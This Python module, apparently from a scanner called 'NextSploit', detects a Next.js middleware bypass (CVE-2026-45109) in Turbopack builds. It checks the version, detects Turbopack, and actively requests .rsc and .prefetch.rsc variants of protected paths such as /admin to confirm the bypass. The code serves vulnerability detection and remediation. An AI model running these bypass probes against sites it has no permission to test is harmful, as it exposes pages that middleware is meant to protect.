#!/usr/bin/env python3
"""
NextSploit — CVE-2026-45109: Middleware Bypass via Turbopack (Incomplete Fix)

Root Cause:
  CVE-2026-44575 was partially fixed in 15.5.16, but the fix did not cover
  the Turbopack bundler code path. When Next.js is run with '--turbopack'
  (or 'turbopack: true' in next.config), the segment-prefetch route variants
  (.rsc, .prefetch.rsc) still bypass middleware — identical attack surface as
  CVE-2026-44575 but exercising the Turbopack resolver.

Detection Strategy:
  1. Version-based check: affected range is 15.5.16–15.5.17.
  2. Turbopack detection via response headers / chunk URL patterns.
  3. Active bypass probe (same technique as CVE-2026-44575) to confirm.

Affected Versions : Next.js 15.5.16 – 15.5.17 with Turbopack
Fixed In          : 15.5.18
CVSS              : High
"""

import requests
from core.config import ScanConfig
from core.cve_database import CVE_DATABASE, check_vuln_status
from core.reporter import ModuleResult, Finding, ScanStatus
from core.output import log_info, log_success, log_warning, log_debug, print_finding

CVE_ID   = "CVE-2026-45109"
CVE_INFO = CVE_DATABASE[CVE_ID]

_PROTECTED_CANDIDATES = [
    "/admin", "/dashboard", "/profile",
    "/settings", "/account", "/api/protected",
]
_BLOCKED_CODES    = {301, 302, 307, 308, 401, 403}
_MIN_BODY_BYTES   = 200


def _detect_turbopack(session: requests.Session, target: str, timeout: int) -> bool:
    """
    Probe for Turbopack indicators in the homepage response.
    Turbopack emits different chunk naming conventions and may expose
    specific headers.
    """
    try:
        r = session.get(f"{target}/", timeout=timeout)
        # Turbopack chunk URLs use /_next/static/chunks/[turbopack] pattern
        if "turbopack" in r.text.lower():
            log_debug("Turbopack detected: 'turbopack' found in page source.")
            return True
        # Some builds expose x-turbopack or similar custom headers
        for header in r.headers:
            if "turbopack" in header.lower():
                log_debug(f"Turbopack detected via header: {header}")
                return True
    except requests.RequestException:
        pass
    return False


def _rsc_bypass_probe(session, target, timeout):
    """
    Probe each candidate protected path for an .rsc bypass.
    Returns (bypass_url, canonical_status, bypass_status, content_type, body_size)
    or None if no bypass found.
    """
    for path in _PROTECTED_CANDIDATES:
        try:
            normal = session.get(f"{target}{path}", timeout=timeout, allow_redirects=False)
        except requests.RequestException:
            continue

        if normal.status_code not in _BLOCKED_CODES:
            log_debug(f"  {path} → HTTP {normal.status_code} (not blocked)")
            continue

        for variant in (f"{path}.rsc", f"{path}.prefetch.rsc"):
            try:
                bypass = session.get(f"{target}{variant}", timeout=timeout, allow_redirects=False)
            except requests.RequestException:
                continue

            if bypass.status_code == 200 and len(bypass.content) >= _MIN_BODY_BYTES:
                return {
                    "bypass_url"    : f"{target}{variant}",
                    "canonical_url" : f"{target}{path}",
                    "canonical_code": normal.status_code,
                    "bypass_code"   : bypass.status_code,
                    "content_type"  : bypass.headers.get("content-type", "N/A"),
                    "body_bytes"    : len(bypass.content),
                }
    return None


def scan(config: ScanConfig) -> ModuleResult:
    result = ModuleResult(
        cve=CVE_ID,
        title=CVE_INFO["title"],
        severity=CVE_INFO["severity"],
        status=ScanStatus.SAFE,
    )

    # Precondition Checks
    if not config.has_app_router():
        result.status=ScanStatus.NOT_APPLICABLE
        log_info(f"[{CVE_ID}] App router not detected. Skipping.")
        return result

    session = config.create_session()
    target  = config.target.rstrip("/")

    log_info(f"Starting {CVE_ID} scan — Middleware Bypass via Turbopack (incomplete fix)...")

    # ── Phase 1: Version check ────────────────────────────────────────────────
    best_ver = config.version_state.best()
    version_detected = best_ver.value if best_ver else None

    if version_detected:
        log_debug(f"Detected version: {version_detected}")
        vuln_status = check_vuln_status(version_detected, CVE_ID)
        if vuln_status == "PATCHED":
            log_success(f"Version {version_detected} is patched for {CVE_ID}.")
            return result
        if vuln_status == "VULNERABLE":
            log_warning(f"Version {version_detected} is in the vulnerable range for {CVE_ID}.")

    # ── Phase 2: Turbopack detection ──────────────────────────────────────────
    log_debug("Detecting Turbopack bundler...")
    turbopack_active = _detect_turbopack(session, target, config.timeout)
    if turbopack_active:
        log_warning("Turbopack bundler detected on target.")
    else:
        log_debug("Turbopack not detected — this CVE only affects Turbopack builds.")

    # ── Phase 3: Active bypass probe ─────────────────────────────────────────
    log_debug("Running active middleware bypass probe (.rsc / .prefetch.rsc)...")
    bypass_info = _rsc_bypass_probe(session, target, config.timeout)

    # ── Phase 4: Decision ─────────────────────────────────────────────────────
    version_vulnerable = False
    if version_detected:
        version_vulnerable = (check_vuln_status(version_detected, CVE_ID) == "VULNERABLE")

    if bypass_info and (version_vulnerable or turbopack_active):
        detail = (
            f"Middleware bypass confirmed via Turbopack incomplete-fix path: "
            f"{bypass_info['canonical_url']} is blocked (HTTP {bypass_info['canonical_code']}) "
            f"but {bypass_info['bypass_url']} returns HTTP {bypass_info['bypass_code']} "
            f"({bypass_info['body_bytes']} bytes)."
        )
        confidence = 0.93
    elif version_vulnerable and turbopack_active:
        detail = (
            f"Next.js {version_detected} (15.5.16–15.5.17) with Turbopack active — "
            f"vulnerable to {CVE_ID}. No middleware-protected path found for active confirmation."
        )
        confidence = 0.80
    elif version_vulnerable:
        detail = (
            f"Next.js {version_detected} is in the vulnerable range for {CVE_ID} "
            "(fix: 15.5.18) but Turbopack was not detected. "
            "Exploitable only when Turbopack is enabled."
        )
        confidence = 0.50
    elif bypass_info and not version_detected:
        detail = (
            f"Active bypass detected ({bypass_info['bypass_url']}) but version unknown. "
            f"Possible {CVE_ID} if Turbopack is in use."
        )
        confidence = 0.60
    else:
        log_success(f"No {CVE_ID} indicators detected on target.")
        return result

    evidence = {
        "detected_version"  : version_detected or "unknown",
        "turbopack_active"  : turbopack_active,
        "bypass_details"    : bypass_info or "N/A (version-based only)",
        "attack_vector"     : "GET /protected-path.rsc or /protected-path.prefetch.rsc",
        "requirement"       : "Next.js must use Turbopack (--turbopack or turbopack:true in next.config)",
        "remediation"       : "Upgrade Next.js to 15.5.18 or newer.",
    }

    log_warning(detail)
    print_finding(CVE_ID, detail, evidence)
    result.add_finding(Finding(
        cve=CVE_ID,
        severity=CVE_INFO["severity"],
        title="Middleware Bypass via Turbopack Incomplete Fix",
        status=ScanStatus.VULNERABLE,
        detail=detail,
        evidence=evidence,
        confidence=confidence,
    ))
    return result

